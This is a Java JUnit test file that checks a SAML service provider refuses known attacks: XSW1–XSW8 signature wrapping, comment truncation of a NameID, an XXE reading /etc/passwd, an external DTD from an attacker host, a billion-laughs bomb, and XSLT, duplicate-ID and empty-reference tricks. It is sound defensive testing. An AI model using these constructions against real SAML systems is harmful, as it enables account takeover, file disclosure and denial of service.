package com.flowtivo.tinfirm.identity.internal.saml;

import static org.assertj.core.api.Assertions.assertThat;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.UUID;
import java.util.function.UnaryOperator;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import net.shibboleth.shared.xml.SerializeSupport;

import tools.jackson.databind.JsonNode;

import com.flowtivo.tinfirm.support.ApiClient;
import com.flowtivo.tinfirm.support.ApiResponse;

/**
 * Known attacks on SAML service providers (ADR-0086, decisions 8 and 16), each on a response the test IdP signed for
 * an attacker, beside a correct one that signs in: the eight signature wrapping variants XSW1 to XSW8 as SAML Raider
 * builds them, the comment truncation of the NameID of 2018, an XXE, an external DTD and a billion laughs, an XSLT
 * transform in the signature, a duplicate {@code ID} and a signature over an empty reference. The victim, a user of
 * the same provider, is never signed in.
 */
class SamlAttackSamplesTest extends SamlIntegrationTest {

    private static final String SAML = "urn:oasis:names:tc:SAML:2.0:assertion";

    private static final String SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol";

    private static final String DS = "http://www.w3.org/2000/09/xmldsig#";

    private static final String FAILED = BASE + "/login?error=SAML_LOGIN_FAILED";

    private String victimSubject;

    private String victimId;

    @BeforeEach
    void victim() {
        victimSubject = "victim-" + UUID.randomUUID() + "@example.com";
        ApiClient browser = new ApiClient(PORT);
        Started started = start(browser, "stub");
        SamlTestIdp.ResponseBuilder response = STUB.respond(spEntityId("stub"), acs("stub"), started.requestId());
        response.nameId = victimSubject;
        response.attribute("email", "v-" + UUID.randomUUID() + "@example.com");
        assertThat(post(browser, "stub", response.encoded()).header("Location")).isEqualTo(BASE + "/");
        victimId = browser.get("/api/me").json().get("id").asString();
    }

    @Test
    void aCorrectResponseSignsTheAttackerIn() {
        Outcome outcome = attack(document -> document);

        assertThat(outcome.location()).isEqualTo(BASE + "/");
        assertThat(outcome.userId()).isNotEqualTo(victimId);
    }

    /** XSW1: an unsigned evil copy of the Response as the root, the signed original inside its signature. */
    @Test
    void xsw1() {
        refused("XSW1", "invalid_response", document -> {
            Element original = document.getDocumentElement();
            Element evil = (Element) original.cloneNode(true);
            removeSignature(evil);
            evil.setAttribute("ID", "_evil-" + UUID.randomUUID());
            becomeVictim(evil);
            Element signature = child(original, DS, "Signature");
            original.removeChild(signature);
            signature.appendChild(original);
            evil.insertBefore(signature, child(evil, SAML, "Issuer").getNextSibling());
            return replaceRoot(document, evil);
        });
    }

    /** XSW2: the evil Response as the root, the signed original as a sibling before its signature. */
    @Test
    void xsw2() {
        refused("XSW2", "invalid_response", document -> {
            Element original = document.getDocumentElement();
            Element evil = (Element) original.cloneNode(true);
            removeSignature(evil);
            evil.setAttribute("ID", "_evil-" + UUID.randomUUID());
            becomeVictim(evil);
            Element signature = child(original, DS, "Signature");
            original.removeChild(signature);
            Node after = child(evil, SAML, "Issuer").getNextSibling();
            evil.insertBefore(signature, after);
            evil.insertBefore(original, signature);
            return replaceRoot(document, evil);
        });
    }

    /** XSW3: an evil copy of the signed Assertion, with another ID, before the original. */
    @Test
    void xsw3() {
        refusedAssertionOnly("XSW3", "unsigned", document -> {
            Element response = document.getDocumentElement();
            Element assertion = child(response, SAML, "Assertion");
            Element evil = (Element) assertion.cloneNode(true);
            removeSignature(evil);
            evil.setAttribute("ID", "_evil-" + UUID.randomUUID());
            becomeVictim(evil);
            response.insertBefore(evil, assertion);
            return document;
        });
    }

    /** XSW4: the evil Assertion in the original's place, the signed original inside it. */
    @Test
    void xsw4() {
        refusedAssertionOnly("XSW4", "invalid_response", document -> {
            Element response = document.getDocumentElement();
            Element assertion = child(response, SAML, "Assertion");
            Element evil = (Element) assertion.cloneNode(true);
            removeSignature(evil);
            evil.setAttribute("ID", "_evil-" + UUID.randomUUID());
            becomeVictim(evil);
            response.replaceChild(evil, assertion);
            evil.appendChild(assertion);
            return document;
        });
    }

    /** XSW5: the signed Assertion changed in place, keeping its signature; an unsigned original at the end. */
    @Test
    void xsw5() {
        refusedAssertionOnly("XSW5", "unsigned", document -> {
            Element response = document.getDocumentElement();
            Element assertion = child(response, SAML, "Assertion");
            Element copy = (Element) assertion.cloneNode(true);
            removeSignature(copy);
            becomeVictim(assertion);
            assertion.setAttribute("ID", "_evil-" + UUID.randomUUID());
            response.appendChild(copy);
            return document;
        });
    }

    /** XSW6: the signed Assertion changed in place, the original inside its signature. */
    @Test
    void xsw6() {
        refusedAssertionOnly("XSW6", "invalid_response", document -> {
            Element response = document.getDocumentElement();
            Element assertion = child(response, SAML, "Assertion");
            Element copy = (Element) assertion.cloneNode(true);
            removeSignature(copy);
            becomeVictim(assertion);
            assertion.setAttribute("ID", "_evil-" + UUID.randomUUID());
            child(assertion, DS, "Signature").appendChild(copy);
            return document;
        });
    }

    /** XSW7: the signed Assertion in an Extensions element, an unsigned evil one in its place. */
    @Test
    void xsw7() {
        refusedAssertionOnly("XSW7", "unsigned", document -> {
            Element response = document.getDocumentElement();
            Element assertion = child(response, SAML, "Assertion");
            Element evil = (Element) assertion.cloneNode(true);
            removeSignature(evil);
            becomeVictim(evil);
            Element extensions = document.createElementNS(SAMLP, "samlp:Extensions");
            response.replaceChild(evil, assertion);
            extensions.appendChild(assertion);
            response.insertBefore(extensions, child(response, SAMLP, "Status"));
            return document;
        });
    }

    /** XSW8: an unsigned evil Assertion whose signature holds the original, without its own signature, in an Object. */
    @Test
    void xsw8() {
        refusedAssertionOnly("XSW8", "signature_invalid", document -> {
            Element response = document.getDocumentElement();
            Element assertion = child(response, SAML, "Assertion");
            Element evil = (Element) assertion.cloneNode(true);
            becomeVictim(evil);
            Element signature = child(evil, DS, "Signature");
            Element object = document.createElementNS(DS, "ds:Object");
            Element original = (Element) assertion.cloneNode(true);
            removeSignature(original);
            object.appendChild(original);
            signature.appendChild(object);
            response.replaceChild(evil, assertion);
            return document;
        });
    }

    /**
     * The 2018 comment truncation: the attacker's NameID {@code victim@example.com<!---->.evil.com}, signed without
     * the comment, reads as the whole text, never as the victim's {@code victim@example.com}.
     */
    @Test
    void aCommentInTheNameIdDoesNotTruncateIt() {
        String attacker = victimSubject + ".evil.com";
        Outcome outcome = attack(attacker, document -> {
            Element nameId = (Element) document.getElementsByTagNameNS(SAML, "NameID").item(0);
            nameId.setTextContent(victimSubject);
            nameId.appendChild(document.createComment(""));
            nameId.appendChild(document.createTextNode(".evil.com"));
            return document;
        });

        // The signature excludes comments, so it still holds: the attacker signs in as themselves.
        assertThat(outcome.location()).isEqualTo(BASE + "/");
        assertThat(outcome.userId()).isNotEqualTo(victimId);
    }

    @Test
    void aCommentInTheEmailAttributeDoesNotTruncateIt() {
        Outcome outcome = attack(document -> {
            Element value = (Element) document.getElementsByTagNameNS(SAML, "AttributeValue").item(0);
            String email = value.getTextContent();
            int at = email.indexOf('@');
            value.setTextContent(email.substring(0, at));
            value.appendChild(document.createComment(""));
            value.appendChild(document.createTextNode(email.substring(at)));
            return document;
        });

        assertThat(outcome.location()).isEqualTo(BASE + "/");
        assertThat(outcome.browser().get("/api/me").json().get("email").asString()).isEqualTo(outcome.email());
    }

    @Test
    void anExternalEntityIsRefused() {
        refusedXml("XXE", xml -> "<?xml version=\"1.0\"?><!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "
                + "\"file:///etc/passwd\">]>" + xml.replaceFirst("<\\?xml[^>]*\\?>", "")
                    .replaceFirst("(<saml2?:Audience>)", "$1&xxe;"));
    }

    @Test
    void anExternalDtdIsRefused() {
        refusedXml("external DTD", xml -> "<?xml version=\"1.0\"?><!DOCTYPE samlp:Response SYSTEM "
                + "\"http://attacker.test/evil.dtd\">" + xml.replaceFirst("<\\?xml[^>]*\\?>", ""));
    }

    @Test
    void aBillionLaughsIsRefused() {
        StringBuilder entities = new StringBuilder("<!ENTITY lol \"lol\">");
        for (int i = 1; i <= 9; i++) {
            entities.append("<!ENTITY lol").append(i).append(" \"");
            for (int j = 0; j < 10; j++) {
                entities.append("&lol").append(i == 1 ? "" : i - 1).append(';');
            }
            entities.append("\">");
        }
        refusedXml("billion laughs", xml -> "<?xml version=\"1.0\"?><!DOCTYPE samlp:Response [" + entities + "]>"
                + xml.replaceFirst("<\\?xml[^>]*\\?>", "").replaceFirst("(<saml2?:Audience>)", "$1&lol9;"));
    }

    @Test
    void anXsltTransformInTheSignatureIsRefused() {
        refused("XSLT", "signature_invalid", document -> {
            Element transforms = (Element) document.getElementsByTagNameNS(DS, "Transforms").item(0);
            Element xslt = document.createElementNS(DS, "ds:Transform");
            xslt.setAttribute("Algorithm", "http://www.w3.org/TR/1999/REC-xslt-19991116");
            Element stylesheet = document.createElementNS("http://www.w3.org/1999/XSL/Transform", "xsl:stylesheet");
            stylesheet.setAttribute("version", "1.0");
            xslt.appendChild(stylesheet);
            transforms.insertBefore(xslt, transforms.getFirstChild());
            return document;
        });
    }

    @Test
    void aDuplicateIdIsRefused() {
        refused("duplicate ID", "signature_invalid", document -> {
            Element response = document.getDocumentElement();
            Element assertion = child(response, SAML, "Assertion");
            Element evil = (Element) assertion.cloneNode(true);
            removeSignature(evil);
            becomeVictim(evil);
            Element extensions = document.createElementNS(SAMLP, "samlp:Extensions");
            extensions.appendChild(evil);
            response.insertBefore(extensions, child(response, SAMLP, "Status"));
            return document;
        });
    }

    @Test
    void aSignatureOverAnEmptyReferenceIsRefused() {
        refused("empty reference", "signature_invalid", document -> {
            Element reference = (Element) document.getElementsByTagNameNS(DS, "Reference").item(0);
            reference.setAttribute("URI", "");
            becomeVictim(document.getDocumentElement());
            return document;
        });
    }

    /** A sign-in with the attacker's response, signed by the IdP, then changed. */
    record Outcome(ApiClient browser, String location, String userId, String email) {
    }

    private Outcome attack(UnaryOperator<Document> change) {
        return attack("attacker-" + UUID.randomUUID() + "@example.com", true, change);
    }

    private Outcome attack(String nameId, UnaryOperator<Document> change) {
        return attack(nameId, true, change);
    }

    /** @param signResponse false for an attack on the assertion's signature: the response unsigned, as Entra sends */
    private Outcome attack(String nameId, boolean signResponse, UnaryOperator<Document> change) {
        ApiClient browser = new ApiClient(PORT);
        Started started = start(browser, "stub");
        SamlTestIdp.ResponseBuilder response = STUB.respond(spEntityId("stub"), acs("stub"), started.requestId());
        response.nameId = nameId;
        response.signResponse = signResponse;
        String email = "a-" + UUID.randomUUID() + "@example.com";
        response.attribute("email", email);
        Document document = change.apply(response.element().getOwnerDocument());
        String xml = SerializeSupport.nodeToString(document.getDocumentElement());
        ApiResponse posted = post(browser, "stub", Base64.getEncoder().encodeToString(xml.getBytes(StandardCharsets.UTF_8)));
        assertThat(posted.status()).as("%s", posted).isEqualTo(302);
        ApiResponse me = browser.get("/api/me");
        return new Outcome(browser, posted.header("Location"), me.status() == 200 ? me.json().get("id").asString() : "",
                email);
    }

    /**
     * @param reason the audited reason: {@code invalid_response} where OpenSAML's unmarshaller already refuses the
     *               document's shape, {@code signature_invalid} where the signature no longer verifies or its reference
     *               is not the signed element's own ID, {@code unsigned} where an assertion the response carries is
     *               not signed
     */
    private void refused(String attack, String reason, UnaryOperator<Document> change) {
        refused(attack, reason, true, change);
    }

    /** An attack on the assertion's signature, in a response whose own signature is not there to stop it. */
    private void refusedAssertionOnly(String attack, String reason, UnaryOperator<Document> change) {
        refused(attack, reason, false, change);
    }

    private void refused(String attack, String reason, boolean signResponse, UnaryOperator<Document> change) {
        Outcome outcome = attack("attacker-" + UUID.randomUUID() + "@example.com", signResponse, change);
        assertThat(outcome.location()).as(attack).isEqualTo(FAILED);
        assertThat(outcome.userId()).as(attack).isEmpty();
        JsonNode failed = latestFailedLogin("stub");
        assertThat(failed.get("details").get("reason").asString()).as(attack).isEqualTo(reason);
    }

    private void refusedXml(String attack, UnaryOperator<String> change) {
        ApiClient browser = new ApiClient(PORT);
        Started started = start(browser, "stub");
        SamlTestIdp.ResponseBuilder response = STUB.respond(spEntityId("stub"), acs("stub"), started.requestId());
        response.attribute("email", "x-" + UUID.randomUUID() + "@example.com");
        String xml = change.apply(response.xml());
        ApiResponse posted = post(browser, "stub", Base64.getEncoder().encodeToString(xml.getBytes(StandardCharsets.UTF_8)));

        assertThat(posted.header("Location")).as(attack).isEqualTo(FAILED);
        assertThat(browser.get("/api/me").status()).isEqualTo(401);
        assertThat(latestFailedLogin("stub").get("details").get("reason").asString()).as(attack)
            .isEqualTo("invalid_response");
    }

    /** The assertion's NameID becomes the victim's. */
    private void becomeVictim(Element within) {
        NodeList nameIds = within.getElementsByTagNameNS(SAML, "NameID");
        for (int i = 0; i < nameIds.getLength(); i++) {
            nameIds.item(i).setTextContent(victimSubject);
        }
    }

    private static void removeSignature(Element element) {
        Element signature = child(element, DS, "Signature");
        if (signature != null) {
            element.removeChild(signature);
        }
    }

    private static Element child(Element parent, String namespace, String name) {
        for (Node node = parent.getFirstChild(); node != null; node = node.getNextSibling()) {
            if (node instanceof Element element && namespace.equals(element.getNamespaceURI())
                    && name.equals(element.getLocalName())) {
                return element;
            }
        }
        return null;
    }

    private static Document replaceRoot(Document document, Element root) {
        // The original root may have moved into the evil copy already, leaving the document without one.
        Element old = document.getDocumentElement();
        if (old != null) {
            document.removeChild(old);
        }
        document.appendChild(root);
        return document;
    }
}
